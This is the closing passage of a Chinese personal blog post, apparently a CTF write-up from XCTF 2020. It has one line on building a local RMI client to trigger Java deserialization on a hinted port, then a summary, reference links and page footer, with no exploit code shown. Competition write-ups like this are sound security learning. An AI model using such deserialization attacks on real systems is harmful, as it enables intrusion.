<p>再根据题目提示的端口 2078, 然后就可以在本地构造一个 RMI 客户端，调用上面这个方法，实施反序列化。</p>
</blockquote>
<hr>
<h4><span id="总结">总结：</span></h4><p>做题还是得想想考点是啥，不要一味死磕。</p>
<p>短板还是辣么多。</p>
<p>nepnep的师傅们tql👅</p>
<hr>
<h4><span id="参考链接">参考链接：</span></h4><p> <a href="https://wx.zsxq.com/dweb2/index/group/824215518412" target="_blank" rel="noopener">https://wx.zsxq.com/dweb2/index/group/824215518412</a> </p>
<p> <a href="https://mp.weixin.qq.com/s?__biz=MzU3ODc2NTg1OA==&amp;mid=2247484827&amp;idx=1&amp;sn=08a52b82dd04c37c17c08bcc85dc42de&amp;chksm=fd7110d6ca0699c02196923e2e95f77fbe5048dd023eba473fc391d7f97afde9f0bb7a6cdd93&amp;mpshare=1&amp;scene=23&amp;srcid=&amp;sharer_sharetime=1583814055793&amp;sharer_shareid=0ed84c079a78a485e04fa50e826c0770#rd" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzU3ODc2NTg1OA==&amp;mid=2247484827&amp;idx=1&amp;sn=08a52b82dd04c37c17c08bcc85dc42de&amp;chksm=fd7110d6ca0699c02196923e2e95f77fbe5048dd023eba473fc391d7f97afde9f0bb7a6cdd93&amp;mpshare=1&amp;scene=23&amp;srcid=&amp;sharer_sharetime=1583814055793&amp;sharer_shareid=0ed84c079a78a485e04fa50e826c0770#rd</a> </p>
<p> <a href="https://blog.de1ta.club/2020/03/10/XCTF-2020/?nsukey=IRbrIReu2wgWelMKXIRg4GOxeF%2BLe8ryMZZza8bY%2B5UgrdvTaFVYAQQuqITVkIY%2F3qZZr53BXziZp0BnYjDfHN9KclyHbOpnuX%2F58pz3L1BhHsLZFkkkuhPAe67XBCpceGlpKo05X3R29J7qpnPi7I0QG7Vfn%2Fyrs2SCrbWEs%2F7mJImS4VdDc%2BLdt4vxOsgUV81pEMEh0mC5qAkz7Y92uA%3D%3D&scene=2&clicktime=1583836967&enterid=1583836967&from=timeline&isappinstalled=0" target="_blank" rel="noopener">https://blog.de1ta.club/2020/03/10/XCTF%3CZHANYI%3E-2020/?nsukey=IRbrIReu2wgWelMKXIRg4GOxeF%2BLe8ryMZZza8bY%2B5UgrdvTaFVYAQQuqITVkIY%2F3qZZr53BXziZp0BnYjDfHN9KclyHbOpnuX%2F58pz3L1BhHsLZFkkkuhPAe67XBCpceGlpKo05X3R29J7qpnPi7I0QG7Vfn%2Fyrs2SCrbWEs%2F7mJImS4VdDc%2BLdt4vxOsgUV81pEMEh0mC5qAkz7Y92uA%3D%3D&amp;scene=2&amp;clicktime=1583836967&amp;enterid=1583836967&amp;from=timeline&amp;isappinstalled=0</a> </p>
<p> <a href="https://mp.weixin.qq.com/s/RjTsvUsx65YTMIg3jejXng" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/RjTsvUsx65YTMIg3jejXng</a></p>

            </div>
          

    
      <footer class="post-footer">

        
         <div>    
          
          <ul class="post-copyright">
             <li class="post-copyright-link">
              <strong>本文作者：</strong>
              <a href="/" title="欢迎访问 glotozz 的个人博客">glotozz</a>
            </li>

            <li class="post-copyright-license">
              <strong>版权声明： </strong>
               本博客所有文章除特别声明外，均采用 CC BY-NC-SA 4.0 许可协议。转载请注明出处！
            </li>
          </ul>
        
      </div>
      
        <div class="post-tags">
          
            <a href="/tags/wp/" rel="tag"><i class="fa fa-tag"></i> wp</a>
          
        </div>
      

        
        
  <nav class="post-nav">
    
      <a class="prev" href="/2020/03/12/Linux%E4%B8%8B%E5%B8%B8%E8%A7%81%E7%BB%B4%E6%9D%83%E6%96%B9%E5%BC%8F/">
        <i class="iconfont icon-left"></i>
        <span class="prev-text nav-default">Linux下常见维权方式</span>
        <span class="prev-text nav-mobile">Prev</span>
      </a>
    
    
      <a class="next" href="/2020/03/04/%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/">
        <span class="next-text nav-default">杂</span>
        <span class="prev-text nav-mobile">Next</span>
        <i class="iconfont icon-right"></i>
      </a>
    
  </nav>

        
  <div class="comments" id="comments">
    
      <div id="vcomments"></div>
    
  </div>


      </footer>
    
  </article>

    </div>

      </div>

      <footer id="colophon">
<span class="copyright-year">
    
        &copy;
    
    2020
    <span class="footer-author">glotozz.</span>
    <span class="power-by">
        Powered by <a class="hexo-link" href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> and <a class="theme-link" href="https://github.com/frostfan/hexo-theme-polarbear" target="_blank" rel="noopener">Polar Bear</a>
    </span>
</span>

      </footer>

      <div class="back-to-top" id="back-to-top">
        <i class="iconfont icon-up"></i>
      </div>
    </div>
    



  
<!-- valine Comments -->
<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
<script src="//cdn.jsdelivr.net/gh/xcss/valine@v1.1.7/dist/Valine.min.js"></script>
<script type="text/javascript">
    new Valine({
        el: '#vcomments',
        notify: false,
        verify: false,
        app_id: "d2XJ52o9D5xTnDd2J92VPPna-gzGzoHsz",
        app_key: "P6wHC0f6Fn02hW8SSdnax8wa",
        placeholder: "Just go go",
        avatar: 'mm'
    });
</script>


    




  
    <script type="text/javascript" src="/lib/jquery/jquery-3.1.1.min.js"></script>
  

  

    <script type="text/javascript" src="/js/src/theme.js?v=1.1"></script>
<script type="text/javascript" src="/js/src/bootstrap.js?v=1.1"></script>

  </body>
</html>
